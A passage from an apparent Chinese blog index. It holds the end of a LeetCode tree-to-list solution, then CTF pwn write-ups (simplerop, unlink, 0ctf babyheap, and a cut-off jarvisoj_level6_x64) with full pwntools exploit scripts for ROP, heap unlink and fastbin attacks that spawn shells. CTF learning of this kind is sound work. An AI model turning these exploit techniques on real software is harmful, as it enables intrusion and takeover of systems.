cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。<br>循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。</p><ul><li>算法流程</li></ul><p>dfs (cur): 递归法中序遍历；</p><p>终止条件： 当节点 cur 为空，代表越过叶节点，直接返回；<br>递归左子树，即 dfs (cur.left) ；<br>构建链表：<br>当 pre 为空时： 代表正在访问链表头节点，记为 head ；<br>当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， cur.left = pre ；<br>保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ；<br>递归右子树，即 dfs (cur.right) ；<br>treeToDoublyList(root)：</p><p>特例处理： 若节点 root 为空，则直接返回；<br>初始化： 空节点 pre ；<br>转化为双向链表： 调用 dfs (root) ；<br>构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可；<br>返回值： 返回链表的头节点 head 即可；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">treeToDoublyList</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        head-&gt;left = pre;</span><br><span class="line">        pre-&gt;right = head;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node *pre, *head;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(Node* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">nullptr</span>) pre-&gt;right = cur; <span class="comment">//用pre来查找</span></span><br><span class="line">        <span class="keyword">else</span> head = cur; <span class="comment">//找到头结点</span></span><br><span class="line">        cur-&gt;left = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析：<br>时间复杂度 O (N)： N 为二叉树的节点数，中序遍历需要访问所有节点。<br>空间复杂度 O (N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O (N) 栈空间。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmcc_simplerop</title>
      <link href="/2022/01/24/cmcc_simplerop/"/>
      <url>/2022/01/24/cmcc_simplerop/</url>
      
        <content type="html"><![CDATA[<p>系统调用 + rop</p><span id="more"></span><h1 id="cmcc_simplerop"><a class="markdownIt-Anchor" href="#cmcc_simplerop">#</a> cmcc_simplerop</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>32 位程序，开了 NX，部分 RELRO 保护</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148415.png" alt="image-20220124214841349"></p><p>主函数存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148568.png" alt="image-20220124214824363"></p><p>该题 没有 system 函数和’/bin/sh’，考虑使用 int 80 系统调用，地址为 0x080493e1</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242159336.png" alt="image-20220124215933258"></p><p>设置系统调用 int80 (11,&quot;/bin/sh&quot;,null,null&quot;) 的参数 eax,ebx,ecx,edx</p><p>找到 eax，进行赋值，地址为 0x080bae06</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242247809.png" alt="image-20220124224731633"></p><p>找到 pop edx;pop,ecx;ret，地址为 0x0806e850</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242218036.png" alt="image-20220124221830924"></p><p>接下来调用 read 函数，将 /bin/sh 写入 bss 段，没有开 PIE，bss 地址为绝对地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242300841.png" alt="image-20220124230033674"></p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 29088)</span></span><br><span class="line">p = process(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806cd50</span></span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_eax_ret = <span class="number">0x0806e850</span></span><br><span class="line">bss_addr = <span class="number">0x080eb584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p32(read_addr)       <span class="comment"># 返回到read函数</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret)<span class="comment"># 平衡栈空间</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)<span class="comment"># read函数的三个参数 </span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)<span class="comment"># 对eax进行赋值为11</span></span><br><span class="line"><span class="comment"># 对edx、ecx、ebx进行赋值</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_unlink</title>
      <link href="/2022/01/19/hitcontraining_unlink/"/>
      <url>/2022/01/19/hitcontraining_unlink/</url>
      
        <content type="html"><![CDATA[<p>ulink</p><span id="more"></span><h1 id="hitcontraining_unlink"><a class="markdownIt-Anchor" href="#hitcontraining_unlink">#</a> hitcontraining_unlink</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>检查：64 位程序，开了 NX 和 canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191955197.png" alt="image-20220119195523133"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192002172.png" alt="image-20220119200216108"></p><p>存在 magic 函数（实际上并没什么用）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192004969.png" alt="image-20220119200403815"></p><p>查看主函数及各菜单功能</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958337.png" alt="image-20220119195845261"></p><p>show()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958451.png" alt="image-20220119195819384"></p><p>add()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959489.png" alt="image-20220119195919396"></p><p>change()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959852.png" alt="image-20220119195949766"></p><p>在 change_item () 函数中并没有对输入的内容 size 进行检查，存在堆溢出</p><p>remove()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192000543.png" alt="image-20220119200014470"></p><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/112602827">unlink 基本知识</a></p><p>新版 unlink 要求</p><blockquote><p>// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致 (size 检查)<br>if (__builtin_expect (chunksize§ != prev_size (next_chunk§), 0))      <br>malloc_printerr (“corrupted size vs. prev_size”);               \</p><p>// 检查 fd 和 bk 指针 (双向链表完整性检查)<br>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      <br>malloc_printerr (check_action, “corrupted double-linked list”, P, AV);  \</p><p>//largebin 中 next_size 双向链表完整性检查<br> if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    <br>malloc_printerr (check_action,                                      <br>“corrupted double-linked list (not small)”,    <br>P, AV);</p></blockquote><p>利用思路：</p><ul><li>构造 fake_chunk</li><li>通过 unlink，把 chunk 移到存储 chunk 指针的内存处</li><li>覆盖 chunk 0 指针为 atoi@got 表地址并泄露</li><li>覆盖 atoi 的 got 表为 system 函数地址。</li><li>给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。</li></ul><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27663</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020C8</span>  <span class="comment">#存放chunk指针的数组在bss段上的地址</span></span><br><span class="line"><span class="comment">#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)</span></span><br><span class="line">fake_chunk =  p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)  <span class="comment">#fake_chunk header</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>) <span class="comment">#fake_chunk fd  bk</span></span><br><span class="line">fake_chunk += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>) <span class="comment"># 1的presize </span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment"># 1的size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#前向合并，合并0中的fake_chunk  放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment">#覆盖的itemlist[0]-&gt;ptr 为atoi_got</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">https://blog.csdn.net/mcmuyanga/article/details/113105091</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf2017-babyheap</title>
      <link href="/2022/01/14/0ctf_2017_babyheap/"/>
      <url>/2022/01/14/0ctf_2017_babyheap/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack</p><span id="more"></span><h2 id="0x01-程序分析"><a class="markdownIt-Anchor" href="#0x01-程序分析">#</a> 0x01 程序分析</h2><p>例行检查，64 位程序，保护全开</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142234035.png" alt="image-20220114223429901"></p><p>ida 查看 main 函数，菜单题</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142237640.png" alt="image-20220114223706573"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142308074.png" alt="image-20220114230844952"></p><p>sub_D48：对应 Allocate 申请内存地址用来存放结构体，申请内存用的是 calloc</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142305611.png" alt="image-20220114230534549"></p><p>sub_E7F：对应编辑 edit，这里没有检查 size ，存在堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142329754.png" alt="image-20220114232935653"></p><p>sub_F50: 对应 delete，free 后指针清零不存在 UAF</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142336137.png" alt="image-20220114233654889"></p><p>sub_1051 就是 puts 打印</p><h2 id="0x02-思路"><a class="markdownIt-Anchor" href="#0x02-思路">#</a> 0x02 思路</h2><p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写</p><h2 id="0x03-exp"><a class="markdownIt-Anchor" href="#0x03-exp">#</a> 0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./0ctf_2017_babyheap&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26060</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-参考文章"><a class="markdownIt-Anchor" href="#0x04-参考文章">#</a> 0x04 参考文章</h2><p><a href="https://blog.csdn.net/qq_43935969/article/details/115877748">https://blog.csdn.net/qq_43935969/article/details/115877748</a></p><p><a href="https://www.cnblogs.com/Rookle/p/12901747.html">https://www.cnblogs.com/Rookle/p/12901747.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level6_x64</title>
      <link href="/2022/01/13/jarvisoj_level6_x64/"/>
      <url>/2022/01/13/jarvisoj_level6_x64/</url>
      
        <content type="html"><![CDATA[<p>double free，unlink 覆写 got 表</p><span id="more"></span><h3 id="0x01-程序分析"><a class="markdownIt-Anchor" href="#0x01-程序分析">#</a> 0x01 程序分析</h3><p>主函数：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201121227754.png" alt="image-20220112122741514"></p><p>之后</p><p>sub_400A49：用户初始堆分配</p><p>sub_400998：要求输入一个操作选项</p><p>sub_400B14：遍历索引打印所有标号和记录内容</p><p>sub_400BC2:  要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则 malloc 一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132322174.png" alt="image-20220113232257966"></p><p>sub_400D87：编辑，是一个 realloc，可以泄露堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132329164.png" alt="image-20220113232933077"></p><p>堆 v2 也就是 size 进行了要求，在最后的 sub_40085D 函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和 system 地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132339024.png" alt="image-20220113233902963"></p><p>sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并 free 掉堆块，存在 double free 漏洞</p><blockquote><p>unlink 思路</p><ul><li>利用 <code>unsorted bin</code>  的 <code>fd</code>  指针分别泄露出 <code>heap</code>  地址和 <code>libc</code>  地址，这样就得到了最初那个 <code>0x1820</code>  大小的 <code>chunk</code>  的地址</li><li>利用 <code>realloc</code>  功能来构造 <code>unlink</code>  条件，结合 <code>uaf</code>  漏洞，修改某个 <code>ptr</code>  为 <code>ptr - 0x18</code> ，这个 <code>ptr</code>  在 <code>0x1820</code>  堆块上</li><li>利用 <code>edit</code>  修改 <code>atoi@got</code>  为 <code>system</code>  地址</li><li>输入 <code>/bin/sh</code>  拿 <code>shell</code></li></ul></blockquote><h3 id="0x02-漏洞利用"><a class="markdownIt-Anchor" href="#0x02-漏洞利用">#</a> 0x02 漏洞利用</h3><p>添加四个 Note，释放 note [0] 和 note [2]，此时 note [0] 的 bk 指向 note [2] 的 chunk，note [2] 的 bk 指向 main_arena+0x58（两个 chunk 都进入 unsorted bin）<br>再次添加 2 个 note，payload 长度为 8，注意结尾不要是 \x00<br> 利用 list 泄露 NOTE 